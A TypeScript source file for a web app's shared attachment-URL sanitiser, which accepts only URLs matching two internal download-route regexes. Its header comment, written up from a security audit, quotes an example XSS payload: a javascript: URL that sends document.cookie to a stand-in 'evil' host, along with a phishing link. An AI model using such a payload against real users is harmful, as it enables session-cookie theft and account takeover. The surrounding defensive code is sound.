/**
 * Shared attachment-URL sanitiser.
 *
 * Extracted from `src/app/api/portal/messages/route.ts` (audit 2b2-F1) so
 * that marketplace routes can reuse the exact same allow-list instead of
 * either rolling their own (drift risk) or importing a route handler
 * (route-to-route import that breaks the route-handler contract).
 *
 * Audit 8c-3: the marketplace negotiation-messages route at
 * `src/app/api/marketplace/negotiations/[id]/messages/route.ts` only
 * HTML-escaped the URL via `sanitizeFields` (which converts `< > " '` to
 * entities but does NOT validate the URL scheme). A malicious partner
 * could send `attachment_url: "javascript:fetch('//evil/?c='+document.cookie)"`
 * or `"https://evil.example.com/phishing"` — the URL would be stored and
 * later rendered as `<a href="..." target="_blank">` in `negotiation-room.tsx`,
 * exposing the recipient to XSS / phishing. Reusing this sanitiser closes
 * that hole at the source — only URLs in the platform's own attachment
 * routes are accepted.
 *
 * Allow-list (matches both legacy and current URL shapes):
 *   - `/api/portal-uploads/<uuid>/download`    (legacy admin-scoped download)
 *   - `/api/portal/attachments/<uuid>`         (current portal-scoped download)
 * Both accept a trailing query-string (e.g. `?v=2` for cache-busting).
 */

const ATTACHMENT_URL_RE_PLURAL = /^\/api\/portal-uploads\/[a-f0-9-]+\/download(\?|$)/;
const ATTACHMENT_URL_RE_SINGULAR = /^\/api\/portal\/attachments\/[a-f0-9-]+(\?|$)/;

/**
 * Returns the input string if it matches the attachment-URL allow-list,
 * otherwise `null`. NEVER throws — callers can use the return value
 * directly in a SQL insert payload without further null-checking.
 */
export function sanitizeAttachmentUrl(value: unknown): string | null {
  if (typeof value !== "string" || value.length === 0) return null;
  if (!ATTACHMENT_URL_RE_PLURAL.test(value) && !ATTACHMENT_URL_RE_SINGULAR.test(value)) {
    return null;
  }
  return value;
}

export { ATTACHMENT_URL_RE_PLURAL, ATTACHMENT_URL_RE_SINGULAR };
